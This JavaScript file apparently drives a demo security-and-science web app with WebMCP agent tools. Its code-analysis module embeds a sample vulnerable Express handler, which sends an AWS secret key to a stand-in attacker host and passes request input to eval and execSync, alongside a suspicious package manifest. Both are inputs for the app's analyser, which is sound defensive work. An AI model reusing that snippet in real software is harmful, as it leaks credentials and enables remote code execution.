/**
 * SENTINEL OMNI-LAB: Unified WebMCP Frontend Application Engine
 *
 * Implements the W3C / OpenAI WebMCP standard (document.modelContext.registerTool),
 * 5 interactive innovation laboratories, and an in-browser autonomous agent cockpit.
 */

import {
  WEBMCP_TOOLS_CATALOG,
  registerAllWebMCPTools,
  BreachLab,
  BioSynth,
  ChronoForensic,
  MetaLoop,
  ZkEscrow
} from './webmcp-bundle.js';

(function () {
  'use strict';

  // =========================================================================
  // 1. WebMCP STANDARD PROTOCOL INITIALIZATION
  // =========================================================================
  function initWebMCP() {
    if (!document.modelContext) {
      // Polyfill modelContext compliant with WebMCP specifications
      const registeredTools = new Map();
      document.modelContext = {
        registerTool: function (toolDef) {
          if (!toolDef || !toolDef.name || typeof toolDef.execute !== 'function') {
            throw new Error('WebMCP standard requires tool name and execute function');
          }
          registeredTools.set(toolDef.name, toolDef);
        },
        getTools: function () {
          return Array.from(registeredTools.values());
        },
        invokeTool: async function (name, input) {
          const tool = registeredTools.get(name);
          if (!tool) throw new Error(`Tool ${name} is not registered in WebMCP`);
          return await tool.execute(input);
        }
      };
    }

    const regResult = registerAllWebMCPTools(document);

    // Populate registered tools drawer list
    const toolsListEl = document.getElementById('registeredToolsList');
    if (toolsListEl) {
      toolsListEl.innerHTML = '';
      WEBMCP_TOOLS_CATALOG.forEach((tool) => {
        const span = document.createElement('span');
        span.className = 'tool-tag';
        span.textContent = tool.name;
        span.title = tool.description;
        toolsListEl.appendChild(span);
      });
    }

    const badge = document.getElementById('toolCountBadge');
    if (badge) badge.textContent = `${WEBMCP_TOOLS_CATALOG.length} Tools Active`;
  }

  // =========================================================================
  // 2. TAB NAVIGATION
  // =========================================================================
  function initTabs() {
    const tabButtons = document.querySelectorAll('.tab-btn');
    const panes = document.querySelectorAll('.module-pane');

    tabButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        const targetId = btn.getAttribute('data-target');
        tabButtons.forEach((b) => b.classList.remove('active'));
        panes.forEach((p) => p.classList.remove('active'));

        btn.classList.add('active');
        const targetPane = document.getElementById(targetId);
        if (targetPane) targetPane.classList.add('active');

        // Redraw canvas if needed
        if (targetId === 'module-breachlab') renderAttackGraph();
        if (targetId === 'module-biosynth') render3DProtein();
        if (targetId === 'module-chrono') renderChronoMap();
      });
    });
  }

  // =========================================================================
  // 3. MODULE 1: SENTINEL BREACHLAB (Zero-Day AST War Room)
  // =========================================================================
  const SAMPLE_ZERO_DAY_CODE = `// CVE-2026-9042: Supply-Chain Remote Code Execution & Secret Theft
const express = require('express');
const { execSync } = require('child_process');
const app = express();

app.post('/api/webhook', (req, res) => {
  const payload = req.query.cmd;
  const token = process.env.AWS_SECRET_ACCESS_KEY;
  
  // Exfiltration sink
  fetch("https://evil-cve-stealer.internal/leak?k=" + token);
  
  // Remote Code Execution sink
  const result = eval(payload);
  execSync(result);
  
  // Prototype pollution attempt
  Object.prototype[req.query.key] = req.query.val;
  
  res.json({ status: 'ok', result });
});`;

  const SAMPLE_POISONED_MANIFEST = `{
  "name": "enterprise-backend-service",
  "version": "2.4.1",
  "dependencies": {
    "express": "*",
    "event-stream-flat": "1.0.0",
    "lodash": "^0.2.0",
    "colors-corrupt": "latest"
  }
}`;

  let currentGraphData = {
    nodes: [
      { id: 'entry', label: 'Entrypoint / Payload', type: 'entry', severity: 'low', blastRadius: 20 },
      { id: 'eval_sink', label: 'RCE (eval)', type: 'sink', severity: 'critical', blastRadius: 95 },
      { id: 'exfil_sink', label: 'Secret Exfil', type: 'exfil', severity: 'critical', blastRadius: 90 },
      { id: 'exec_sink', label: 'Shell Injection', type: 'sink', severity: 'high', blastRadius: 75 }
    ],
    edges: [
      { from: 'entry', to: 'eval_sink', label: 'triggers', tainted: true },
      { from: 'entry', to: 'exfil_sink', label: 'triggers', tainted: true },
      { from: 'entry', to: 'exec_sink', label: 'triggers', tainted: true }
    ]
  };

  function initBreachLab() {
    const inputArea = document.getElementById('breachInput');
    if (inputArea) inputArea.value = SAMPLE_ZERO_DAY_CODE;

    document.getElementById('loadSampleRce')?.addEventListener('click', () => {
      inputArea.value = SAMPLE_ZERO_DAY_CODE;
      runBreachAnalysis();
    });

    document.getElementById('loadSampleSupplyChain')?.addEventListener('click', () => {
      inputArea.value = SAMPLE_POISONED_MANIFEST;
      runBreachAnalysis();
    });

    document.getElementById('runBreachLabAnalysis')?.addEventListener('click', runBreachAnalysis);

    document.getElementById('btnDetonateSandbox')?.addEventListener('click', () => {
      const code = inputArea.value;
      const report = BreachLab.detonateSandbox(code);
      const consoleEl = document.getElementById('sandboxConsoleOutput');
      if (consoleEl) {
        let text = `[DETONATION REPORT - Execution Time: ${report.executionTimeMs}ms]\n`;
        text += `Safe To Run: ${report.safeToRun ? 'YES' : 'NO (CRITICAL THREATS INTERCEPTED)'}\n`;
        text += `Quarantined Threats: ${report.quarantinedThreats.join(', ') || 'None'}\n\n`;
        report.interceptedEvents.forEach((e) => {
          text += `[${e.timestamp}ms] ${e.action} -> ${e.target} | BLOCKED: ${e.blocked}\n  Alert: ${e.alert}\n`;
        });
        consoleEl.textContent = text;
      }
    });

    document.getElementById('btnTraceTaint')?.addEventListener('click', () => {
      const code = inputArea.value;
      const trace = BreachLab.traceTaintFlow(code);
      const consoleEl = document.getElementById('sandboxConsoleOutput');
      if (consoleEl) {
        let text = `[TAINT FLOW TRACE - Vulnerable: ${trace.isVulnerable ? 'YES' : 'NO'}]\n`;
        text += `Tracked Tainted Variables: ${trace.taintedVariables.join(', ') || 'None'}\n\n`;
        trace.taintTrace.forEach((step) => {
          text += `[L${step.line} - ${step.type}] ${step.text} (Var: ${step.variable || 'n/a'})\n`;
        });
        consoleEl.textContent = text;
      }
    });

    document.getElementById('btnGenerateHotpatch')?.addEventListener('click', () => {
      const code = inputArea.value;
      const patch = BreachLab.generateHotpatch(code);
      const diffEl = document.getElementById('hotpatchDiffOutput');
      const scoreGainEl = document.getElementById('patchScoreGain');
      if (diffEl) {
        diffEl.textContent = patch.diff.join('\n') || '// No critical vulnerabilities requiring rewriting.';
      }
      if (scoreGainEl) {
        scoreGainEl.textContent = `+${patch.securityScoreImprovement} Security Score`;
      }
    });

    renderAttackGraph();
  }

  function runBreachAnalysis() {
    const inputArea = document.getElementById('breachInput');
    const code = inputArea.value;
    const result = BreachLab.analyzeCveAst(code, { checkSupplyChain: true });

    // Update Metrics
    const verdictEl = document.getElementById('breachVerdict');
    if (verdictEl) {
      verdictEl.textContent = result.verdict;
      verdictEl.className = `status-pill ${result.threatScore >= 50 ? 'danger' : 'success'}`;
    }

    const entropyEl = document.getElementById('entropyDisplay');
    if (entropyEl) entropyEl.textContent = `Entropy: ${result.astMetrics.entropy}`;

    const threatScoreVal = document.getElementById('threatScoreVal');
    if (threatScoreVal) threatScoreVal.textContent = `${result.threatScore}/100`;

    const dangerousCallsVal = document.getElementById('dangerousCallsVal');
    if (dangerousCallsVal) dangerousCallsVal.textContent = String(result.astMetrics.dangerousCallsCount);

    const vulnCountVal = document.getElementById('vulnCountVal');
    if (vulnCountVal) vulnCountVal.textContent = String(result.findings.length);

    const maxBlast = result.graph.nodes.reduce((m, n) => Math.max(m, n.blastRadius), 0);
    const blastRadiusVal = document.getElementById('blastRadiusVal');
    if (blastRadiusVal) blastRadiusVal.textContent = `${maxBlast}%`;

    currentGraphData = result.graph;
    renderAttackGraph();
  }

  function renderAttackGraph() {
    const canvas = document.getElementById('attackGraphCanvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    ctx.clearRect(0, 0, canvas.width, canvas.height);

    const nodes = currentGraphData.nodes;
    const count = nodes.length;
    const centerX = canvas.width / 2;
    const centerY = canvas.height / 2;
    const radius = Math.min(100, canvas.height / 2 - 40);

    // Calculate positions
    const posMap = new Map();
    nodes.forEach((n, idx) => {
      if (idx === 0) {
        posMap.set(n.id, { x: 70, y: centerY });
      } else {
        const angle = ((idx - 1) / (count - 1 || 1)) * Math.PI - Math.PI / 2;
        posMap.set(n.id, {
          x: centerX + Math.cos(angle) * (radius + 40),
          y: centerY + Math.sin(angle) * radius
        });
      }
    });

    // Draw Edges
    currentGraphData.edges.forEach((edge) => {
      const p1 = posMap.get(edge.from);
      const p2 = posMap.get(edge.to);
      if (p1 && p2) {
        ctx.beginPath();
        ctx.moveTo(p1.x, p1.y);
        ctx.lineTo(p2.x, p2.y);
        ctx.strokeStyle = edge.tainted ? '#f43f5e' : '#4facfe';
        ctx.lineWidth = edge.tainted ? 2.5 : 1.5;
        ctx.stroke();

        ctx.fillStyle = '#94a3b8';
        ctx.font = '10px monospace';
        ctx.fillText(edge.label, (p1.x + p2.x) / 2, (p1.y + p2.y) / 2 - 5);
      }
    });

    // Draw Nodes
    nodes.forEach((n) => {
      const pos = posMap.get(n.id);
      if (!pos) return;

      if (n.blastRadius > 40) {
        ctx.beginPath();
        ctx.arc(pos.x, pos.y, n.blastRadius * 0.35, 0, Math.PI * 2);
        ctx.fillStyle = n.severity === 'critical' ? 'rgba(244, 63, 94, 0.2)' : 'rgba(245, 158, 11, 0.2)';
        ctx.fill();
      }

      ctx.beginPath();
      ctx.arc(pos.x, pos.y, 14, 0, Math.PI * 2);
      ctx.fillStyle = n.severity === 'critical' ? '#f43f5e' : n.severity === 'high' ? '#f59e0b' : '#00f2fe';
      ctx.fill();
      ctx.strokeStyle = '#fff';
      ctx.lineWidth = 1.5;
      ctx.stroke();

      ctx.fillStyle = '#f1f5f9';
      ctx.font = '11px sans-serif';
      ctx.textAlign = 'center';
      ctx.fillText(n.label, pos.x, pos.y + 26);
    });
  }

  // =========================================================================
  // 4. MODULE 2: BIOSYNTH STUDIO (3D Molecular CAD)
  // =========================================================================
  let proteinData = BioSynth.parsePDB(BioSynth.SAMPLE_PDB_1CRN);
  let proteinRotY = 0;
  let isDraggingProtein = false;
  let lastMouseX = 0;

  function initBioSynth() {
    const canvas = document.getElementById('bioSynthCanvas');
    if (canvas) {
      canvas.addEventListener('mousedown', (e) => {
        isDraggingProtein = true;
        lastMouseX = e.clientX;
      });
      window.addEventListener('mouseup', () => (isDraggingProtein = false));
      window.addEventListener('mousemove', (e) => {
        if (!isDraggingProtein) return;
        const delta = e.clientX - lastMouseX;
        proteinRotY += delta * 0.015;
        lastMouseX = e.clientX;
        render3DProtein();
      });
    }

    document.getElementById('loadDemoProteinBtn')?.addEventListener('click', () => {
      proteinData = BioSynth.parsePDB(BioSynth.SAMPLE_PDB_1CRN);
      render3DProtein();
      scanPockets();
    });

    document.getElementById('btnSimulateMutation')?.addEventListener('click', () => {
      const chainInput = document.getElementById('mutChain');
      const seqInput = document.getElementById('mutResSeq');
      const targetResInput = document.getElementById('mutTargetRes');

      const chain = (chainInput && chainInput.value) || 'A';
      const seq = parseInt((seqInput && seqInput.value) || '2', 10);
      const targetRes = (targetResInput && targetResInput.value) || 'TRP';

      const sim = BioSynth.simulateMutation(proteinData.atoms, chain, seq, targetRes);

      const ddGEl = document.getElementById('deltaDeltaGVal');
      if (ddGEl) ddGEl.textContent = `${sim.deltaDeltaG > 0 ? '+' : ''}${sim.deltaDeltaG} kcal/mol`;

      const ddGDesc = document.getElementById('deltaGDesc');
      if (ddGDesc) ddGDesc.textContent = sim.stabilityVerdict.replace(/_/g, ' ');

      const verdictBadge = document.getElementById('mutationVerdictBadge');
      if (verdictBadge) {
        verdictBadge.textContent = sim.stabilityVerdict;
        verdictBadge.className = `status-pill ${sim.stabilityVerdict.includes('CLASH') || sim.stabilityVerdict.includes('DESTABILIZING') ? 'danger' : 'success'}`;
      }

      const clashList = document.getElementById('clashItemsList');
      if (clashList) {
        clashList.innerHTML = '';
        if (sim.stericClashes.length === 0) {
          clashList.innerHTML = '<li class="muted">No steric clashes found. Clean structural fit.</li>';
        } else {
          sim.stericClashes.forEach((c) => {
            const li = document.createElement('li');
            li.style.color = c.clashSeverity === 'CRITICAL' ? '#f43f5e' : '#f59e0b';
            li.textContent = `[${c.clashSeverity}] ${c.atom1} <-> ${c.atom2} (${c.distanceAngstroms}Å)`;
            clashList.appendChild(li);
          });
        }
      }

      const recText = document.getElementById('bioRecommendationText');
      if (recText) recText.textContent = sim.recommendation;

      render3DProtein();
    });

    document.getElementById('scanBindingPocketsBtn')?.addEventListener('click', scanPockets);

    render3DProtein();
    scanPockets();
  }

  function scanPockets() {
    const pockets = BioSynth.findBindingPockets(proteinData.atoms);
    const grid = document.getElementById('pocketGrid');
    if (!grid) return;
    grid.innerHTML = '';

    if (pockets.length === 0) {
      grid.innerHTML = '<div class="pocket-card"><p>No large catalytic pockets detected in fragment.</p></div>';
      return;
    }

    pockets.forEach((p) => {
      const div = document.createElement('div');
      div.className = 'pocket-card';
      div.innerHTML = `
        <h4>${p.id} · Druggability: <strong>${p.druggabilityScore}</strong></h4>
        <p>${p.description}</p>
        <p style="margin-top: 4px; font-size: 0.75rem; color: #94a3b8;">Lining Residues: ${p.liningResidues.map((r) => `${r.name}${r.seq}`).join(', ')}</p>
      `;
      grid.appendChild(div);
    });
  }

  function render3DProtein() {
    const canvas = document.getElementById('bioSynthCanvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    ctx.clearRect(0, 0, canvas.width, canvas.height);

    const atoms = proteinData.atoms;
    if (atoms.length === 0) return;

    let cx = 0, cy = 0, cz = 0;
    atoms.forEach((a) => {
      cx += a.x;
      cy += a.y;
      cz += a.z;
    });
    cx /= atoms.length;
    cy /= atoms.length;
    cz /= atoms.length;

    const scale = 18;
    const midX = canvas.width / 2;
    const midY = canvas.height / 2;

    const projected = atoms.map((a) => {
      const rx = a.x - cx;
      const ry = a.y - cy;
      const rz = a.z - cz;

      const rotX = rx * Math.cos(proteinRotY) + rz * Math.sin(proteinRotY);
      const rotZ = -rx * Math.sin(proteinRotY) + rz * Math.cos(proteinRotY);

      return {
        ...a,
        projX: midX + rotX * scale,
        projY: midY - ry * scale,
        depth: rotZ
      };
    });

    projected.sort((a, b) => a.depth - b.depth);

    ctx.strokeStyle = 'rgba(79, 172, 254, 0.4)';
    ctx.lineWidth = 3;
    ctx.beginPath();
    for (let i = 0; i < projected.length - 1; i++) {
      const p1 = projected[i];
      const p2 = projected[i + 1];
      if (Math.abs(p1.resSeq - p2.resSeq) <= 1) {
        ctx.moveTo(p1.projX, p1.projY);
        ctx.lineTo(p2.projX, p2.projY);
      }
    }
    ctx.stroke();

    projected.forEach((a) => {
      let color = '#10b981';
      if (a.element === 'N') color = '#00f2fe';
      if (a.element === 'O') color = '#f43f5e';
      if (a.element === 'S') color = '#f59e0b';

      const radius = Math.max(3, 7 + a.depth * 0.4);

      ctx.beginPath();
      ctx.arc(a.projX, a.projY, radius, 0, Math.PI * 2);
      ctx.fillStyle = color;
      ctx.fill();
      ctx.strokeStyle = 'rgba(255,255,255,0.6)';
      ctx.lineWidth = 1;
      ctx.stroke();

      if (a.name === 'CA') {
        ctx.fillStyle = '#f1f5f9';
        ctx.font = '10px monospace';
        ctx.fillText(`${a.resName}${a.resSeq}`, a.projX + 8, a.projY - 4);
      }
    });
  }

  // =========================================================================
  // 5. MODULE 3: CHRONOFORENSIC OSINT
  // =========================================================================
  let currentFeeds = ChronoForensic.DEMO_FEEDS;
  let lastTriangulation = ChronoForensic.triangulateAcousticOrigin(
    currentFeeds.map((f) => ({ feedId: f.id, position: f.geoPosition, arrivalTimeSec: f.acousticEvents[0].timestampSec }))
  );

  function initChronoForensic() {
    renderChronoFeeds();
    renderChronoMap();

    document.getElementById('loadDroneStreamsBtn')?.addEventListener('click', () => {
      currentFeeds = ChronoForensic.DEMO_FEEDS;
      renderChronoFeeds();
      renderChronoMap();
    });

    document.getElementById('runTriangulationBtn')?.addEventListener('click', () => {
      lastTriangulation = ChronoForensic.triangulateAcousticOrigin(
        currentFeeds.map((f) => ({ feedId: f.id, position: f.geoPosition, arrivalTimeSec: f.acousticEvents[0].timestampSec }))
      );

      const coordsEl = document.getElementById('originCoordsVal');
      if (coordsEl) {
        coordsEl.textContent = `(${lastTriangulation.estimatedSourceLocation.x}, ${lastTriangulation.estimatedSourceLocation.y}, ${lastTriangulation.estimatedSourceLocation.z})`;
      }

      const radiusEl = document.getElementById('confRadiusVal');
      if (radiusEl) radiusEl.textContent = `±${lastTriangulation.confidenceRadiusMeters}m`;

      renderChronoMap();
    });
  }

  function renderChronoFeeds() {
    const list = document.getElementById('streamFeedList');
    if (!list) return;
    list.innerHTML = '';

    const ref = currentFeeds[0];
    currentFeeds.forEach((feed) => {
      const sync = ChronoForensic.synchronizeOpticalFlashes(ref, feed);
      const div = document.createElement('div');
      div.className = 'feed-item';
      div.innerHTML = `
        <div class="feed-info">
          <h4>${feed.sourceName} <span class="live-tag">${feed.cameraType}</span></h4>
          <p>Pos: (${feed.geoPosition.x}m, ${feed.geoPosition.y}m, ${feed.geoPosition.z}m) · ${feed.recordedFps} FPS · Optical Flash: ${feed.opticalEvents[0]?.timestampSec}s</p>
        </div>
        <div class="feed-offset">${sync.calculatedOffsetMs >= 0 ? '+' : ''}${sync.calculatedOffsetMs} ms</div>
      `;
      list.appendChild(div);
    });
  }

  function renderChronoMap() {
    const canvas = document.getElementById('chronoMapCanvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    ctx.clearRect(0, 0, canvas.width, canvas.height);

    const midX = canvas.width / 2;
    const midY = canvas.height / 2;
    const scale = 2.2;

    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.lineWidth = 1;
    for (let x = 0; x < canvas.width; x += 40) {
      ctx.beginPath();
      ctx.moveTo(x, 0);
      ctx.lineTo(x, canvas.height);
      ctx.stroke();
    }
    for (let y = 0; y < canvas.height; y += 40) {
      ctx.beginPath();
      ctx.moveTo(0, y);
      ctx.lineTo(canvas.width, y);
      ctx.stroke();
    }

    currentFeeds.forEach((f) => {
      const sx = midX + f.geoPosition.x * scale;
      const sy = midY - f.geoPosition.y * scale;

      ctx.beginPath();
      ctx.arc(sx, sy, 8, 0, Math.PI * 2);
      ctx.fillStyle = '#00f2fe';
      ctx.fill();
      ctx.strokeStyle = '#fff';
      ctx.stroke();

      ctx.fillStyle = '#94a3b8';
      ctx.font = '10px monospace';
      ctx.fillText(f.id, sx + 12, sy + 4);
    });

    if (lastTriangulation) {
      const ox = midX + lastTriangulation.estimatedSourceLocation.x * scale;
      const oy = midY - lastTriangulation.estimatedSourceLocation.y * scale;

      ctx.beginPath();
      ctx.arc(ox, oy, 40, 0, Math.PI * 2);
      ctx.strokeStyle = 'rgba(244, 63, 94, 0.4)';
      ctx.lineWidth = 2;
      ctx.stroke();

      ctx.beginPath();
      ctx.arc(ox, oy, 80, 0, Math.PI * 2);
      ctx.strokeStyle = 'rgba(244, 63, 94, 0.2)';
      ctx.stroke();

      ctx.beginPath();
      ctx.arc(ox, oy, 10, 0, Math.PI * 2);
      ctx.fillStyle = '#f43f5e';
      ctx.fill();
      ctx.strokeStyle = '#fff';
      ctx.lineWidth = 2;
      ctx.stroke();

      ctx.fillStyle = '#f43f5e';
      ctx.font = '11px sans-serif';
      ctx.fillText('Triangulated Origin (Blast)', ox - 60, oy - 16);
    }
  }

  // =========================================================================
  // 6. MODULE 4: METALOOP FLIGHT SIMULATOR
  // =========================================================================
  let currentTraceSteps = [...MetaLoop.DEMO_AGENT_TRACES];

  function initMetaLoop() {
    renderTraceTree();

    document.getElementById('loadTrappedTraceBtn')?.addEventListener('click', () => {
      currentTraceSteps = [...MetaLoop.DEMO_AGENT_TRACES];
      renderTraceTree();
    });

    document.getElementById('btnForkAndInject')?.addEventListener('click', () => {
      const mockStepInput = document.getElementById('mockStepId');
      const mockPayloadInput = document.getElementById('mockPayloadJson');

      const forkStepId = (mockStepInput && mockStepInput.value) || 'step_2';
      let payload = { status: 'CACHE_RESOLVED', cve: 'CVE-2026-4109', safeVersion: '4.17.22' };
      try {
        if (mockPayloadInput && mockPayloadInput.value) {
          payload = JSON.parse(mockPayloadInput.value);
        }
      } catch {}

      const forkRes = MetaLoop.forkAndInjectSyntheticTool(currentTraceSteps, forkStepId, 'search_nvd_database', payload);
      currentTraceSteps = forkRes.forkedSteps;
      renderTraceTree();

      const healthBadge = document.getElementById('swarmHealthBadge');
      if (healthBadge) {
        healthBadge.textContent = 'Recovered (Health: 95%)';
        healthBadge.className = 'status-pill success';
      }
    });

    document.getElementById('btnMitigateDrift')?.addEventListener('click', () => {
      const inspection = MetaLoop.inspectTraceTree(currentTraceSteps);
      const mitigation = MetaLoop.synthesizeDriftMitigation(inspection.anomalies);
      const out = document.getElementById('driftDirectivesOutput');
      if (out) out.textContent = `${mitigation.systemPatch}\n\nRecovery Action: ${mitigation.recoveryAction}`;
    });
  }

  function renderTraceTree() {
    const container = document.getElementById('traceTreeContainer');
    if (!container) return;
    container.innerHTML = '';

    currentTraceSteps.forEach((step) => {
      const div = document.createElement('div');
      div.className = `trace-node ${step.status === 'LOOP_DETECTED' ? 'loop' : step.status === 'SUCCESS' && step.parentId && step.parentId.includes('syn') ? 'forked' : ''}`;
      div.innerHTML = `
        <div class="trace-meta">
          <span>${step.stepId} · <strong>${step.agentRole.toUpperCase()}</strong> [${step.actionType}]</span>
          <span class="status-pill ${step.status === 'LOOP_DETECTED' ? 'danger' : 'success'}">${step.status}</span>
        </div>
        <div class="trace-text">
          ${step.toolName ? `<strong>Tool Call:</strong> <code>${step.toolName}</code>` : ''}
          ${step.thoughtSummary ? `<div>${step.thoughtSummary}</div>` : ''}
          <div style="font-size: 0.72rem; color: #64748b; margin-top: 4px;">Tokens: ${step.tokenCost} · Entropy: ${step.entropyScore}</div>
        </div>
      `;
      container.appendChild(div);
    });
  }

  // =========================================================================
  // 7. MODULE 5: ZK PEER-TO-PEER ESCROW
  // =========================================================================
  let currentContract = ZkEscrow.DEMO_CONTRACT;

  function initZkEscrow() {
    renderContract();

    document.getElementById('initEscrowDemoBtn')?.addEventListener('click', () => {
      currentContract = ZkEscrow.DEMO_CONTRACT;
      renderContract();
    });

    document.getElementById('verifyDeliverableBtn')?.addEventListener('click', () => {
      const deliverableInput = document.getElementById('deliverableContent');
      const content = (deliverableInput && deliverableInput.value) || '';
      const sha = ZkEscrow.calculateSha256(content);
      const shaEl = document.getElementById('computedSha256');
      if (shaEl) shaEl.textContent = `${sha.slice(0, 16)}...${sha.slice(-8)}`;

      const result = ZkEscrow.verifyMilestoneDeliverable(currentContract, 'M-1', content, [
        { description: 'AST Sanitization verified', pass: true }
      ]);

      renderContract();
      alert(`Milestone Verification Result: ${result.arbitrationVerdict}\nDeliverable SHA-256: ${result.actualSha256}`);
    });

    document.getElementById('btnRunAcceptanceTests')?.addEventListener('click', () => {
      const deliverableInput = document.getElementById('deliverableContent');
      const content = (deliverableInput && deliverableInput.value) || '';
      const result = ZkEscrow.verifyMilestoneDeliverable(currentContract, 'M-1', content, [
        { description: 'No dynamic eval() statements', pass: !content.includes('eval(') },
        { description: 'Exports sanitized handler', pass: content.includes('function') }
      ]);
      alert(`Test Assertions Complete!\nSuite Passed: ${result.testSuitePassed ? 'YES' : 'NO'}\nFailed Criteria: ${result.failedCriteria.join(', ') || 'None'}`);
    });

    document.getElementById('btnSignEscrowRelease')?.addEventListener('click', () => {
      const proof = ZkEscrow.signEscrowRelease(currentContract, 'M-1');
      const proofOut = document.getElementById('proofJsonOutput');
      if (proofOut) proofOut.textContent = JSON.stringify(proof, null, 2);
      renderContract();
    });
  }

  function renderContract() {
    const list = document.getElementById('escrowMilestonesList');
    if (!list) return;
    list.innerHTML = '';

    currentContract.milestones.forEach((m) => {
      const div = document.createElement('div');
      div.className = 'milestone-item';
      div.innerHTML = `
        <div>
          <h4>${m.title}</h4>
          <p>Payout: $${m.payoutAmountUsd} USD · Target SHA-256: ${m.expectedFileSha256.slice(0, 12)}...</p>
        </div>
        <span class="status-pill ${m.status === 'RELEASED' ? 'success' : m.status === 'VERIFIED' ? 'highlight' : ''}">${m.status}</span>
      `;
      list.appendChild(div);
    });
  }

  // =========================================================================
  // 8. AUTONOMOUS WEBMCP AGENT COCKPIT DRAWER
  // =========================================================================
  function initAgentDrawer() {
    const drawer = document.getElementById('agentDrawer');
    const backdrop = document.getElementById('agentDrawerBackdrop');
    const openBtn = document.getElementById('openAgentDrawerBtn');
    const closeBtn = document.getElementById('closeAgentDrawerBtn');

    function openDrawer() {
      drawer?.classList.add('open');
      backdrop?.classList.add('active');
    }

    function closeDrawer() {
      drawer?.classList.remove('open');
      backdrop?.classList.remove('active');
    }

    openBtn?.addEventListener('click', openDrawer);
    closeBtn?.addEventListener('click', closeDrawer);
    backdrop?.addEventListener('click', closeDrawer);

    document.querySelectorAll('.mission-chip').forEach((chip) => {
      chip.addEventListener('click', async () => {
        const mission = chip.getAttribute('data-mission');
        if (!mission) return;

        openDrawer();
        if (mission === 'breach') {
          await runAgentMission('Audit potential zero-day vulnerability in repository and synthesize cryptographic hotpatch.');
        } else if (mission === 'bio') {
          await runAgentMission('Simulate CRISPR mutation on chain A residue 2 to TRP and verify steric clashes.');
        } else if (mission === 'chrono') {
          await runAgentMission('Align drone and bodycam optical streams and triangulate acoustic origin.');
        } else if (mission === 'meta') {
          await runAgentMission('Detect infinite agent tool calling loop and fork recovery branch.');
        } else if (mission === 'escrow') {
          await runAgentMission('Verify contractor code hash against milestone criteria and sign escrow release.');
        }
      });
    });

    document.getElementById('btnSendAgentPrompt')?.addEventListener('click', () => {
      const input = document.getElementById('agentComposerInput');
      if (!input || !input.value.trim()) return;
      const text = input.value.trim();
      input.value = '';
      runAgentMission(text);
    });
  }

  async function runAgentMission(prompt) {
    const stream = document.getElementById('agentExecutionStream');
    if (!stream) return;

    const userMsg = document.createElement('div');
    userMsg.className = 'agent-msg user';
    userMsg.innerHTML = `<div class="msg-meta">OPERATOR</div><div class="msg-body">${prompt}</div>`;
    stream.appendChild(userMsg);
    stream.scrollTop = stream.scrollHeight;

    const appendAssistant = (text, toolCall) => {
      const asstMsg = document.createElement('div');
      asstMsg.className = 'agent-msg assistant';
      let content = `<div class="msg-meta">WEBMCP AUTONOMOUS AGENT</div><div class="msg-body">${text}</div>`;
      if (toolCall) {
        content += `
          <div class="tool-invoked-box">
            <div><span class="tool-name-badge">invokeTool:</span> <code>${toolCall.name}</code></div>
            <pre style="color: #7dd3fc; margin-top: 4px; overflow: auto; max-height: 90px;">${JSON.stringify(toolCall.result, null, 2)}</pre>
          </div>
        `;
      }
      asstMsg.innerHTML = content;
      stream.appendChild(asstMsg);
      stream.scrollTop = stream.scrollHeight;
    };

    if (prompt.includes('zero-day') || prompt.includes('patch') || prompt.includes('audit')) {
      appendAssistant('Analyzing AST patterns for remote code execution and credential exfiltration vulnerabilities...');
      const toolRes = await document.modelContext.invokeTool('breachlab_analyze_cve_ast', {
        codeOrManifest: SAMPLE_ZERO_DAY_CODE
      });
      appendAssistant(`AST inspection complete. Threat score: ${toolRes.threatScore}/100 [${toolRes.verdict}]. Synthesizing hotpatch diff...`, {
        name: 'breachlab_analyze_cve_ast',
        input: { checkSupplyChain: true },
        result: toolRes
      });
      const patchRes = await document.modelContext.invokeTool('breachlab_generate_hotpatch', {
        code: SAMPLE_ZERO_DAY_CODE
      });
      appendAssistant(`Hotpatch synthesized. Security score gained: +${patchRes.securityScoreImprovement}. Dangerous sinks neutralized.`, {
        name: 'breachlab_generate_hotpatch',
        input: {},
        result: patchRes
      });
    } else if (prompt.includes('CRISPR') || prompt.includes('mutation') || prompt.includes('protein')) {
      appendAssistant('Loading 3D crystallographic structure for Crambin (1CRN)...');
      const bioRes = await document.modelContext.invokeTool('biosynth_mutate_residue', {
        chain: 'A',
        resSeq: 2,
        targetResidue3: 'TRP'
      });
      appendAssistant(`In-silico point mutation simulated. Predicted stability: ${bioRes.stabilityVerdict} (ΔΔG: ${bioRes.deltaDeltaG} kcal/mol).`, {
        name: 'biosynth_mutate_residue',
        input: { chain: 'A', resSeq: 2, targetResidue3: 'TRP' },
        result: bioRes
      });
    } else if (prompt.includes('drone') || prompt.includes('audio') || prompt.includes('triangulate')) {
      appendAssistant('Fetching multi-angle sensor streams and running 3D acoustic TDOA multilateration...');
      const triRes = await document.modelContext.invokeTool('chrono_triangulate_acoustic_source', {});
      appendAssistant(`Triangulation converged on coordinates (${triRes.estimatedSourceLocation.x}, ${triRes.estimatedSourceLocation.y}, ${triRes.estimatedSourceLocation.z}) with ±${triRes.confidenceRadiusMeters}m confidence margin.`, {
        name: 'chrono_triangulate_acoustic_source',
        input: {},
        result: triRes
      });
    } else if (prompt.includes('loop') || prompt.includes('swarm') || prompt.includes('fork')) {
      appendAssistant('Inspecting swarm trace tree for cognitive loops and drift...');
      const traceRes = await document.modelContext.invokeTool('metaloop_inspect_trace_tree', {});
      appendAssistant(`Trapped loop detected on step 3. Injecting synthetic tool resolution and forking recovery branch...`, {
        name: 'metaloop_inspect_trace_tree',
        input: {},
        result: traceRes
      });
      const forkRes = await document.modelContext.invokeTool('metaloop_inject_synthetic_tool', {
        forkPointStepId: 'step_2',
        syntheticToolName: 'search_nvd_database',
        syntheticOutput: { status: 'CACHE_RESOLVED', safeVersion: '4.17.22' }
      });
      appendAssistant(`Swarm successfully recovered. Fork branch active: ${forkRes.newBranchId}.`, {
        name: 'metaloop_inject_synthetic_tool',
        input: {},
        result: forkRes
      });
    } else if (prompt.includes('escrow') || prompt.includes('deliverable') || prompt.includes('release')) {
      appendAssistant('Computing SHA-256 fingerprint on contractor deliverable and validating acceptance assertions...');
      const verifyRes = await document.modelContext.invokeTool('zkescrow_verify_deliverable_hash', {
        milestoneId: 'M-1',
        submittedContent: 'function patchVulnerability(ast) { return sanitize(ast); }'
      });
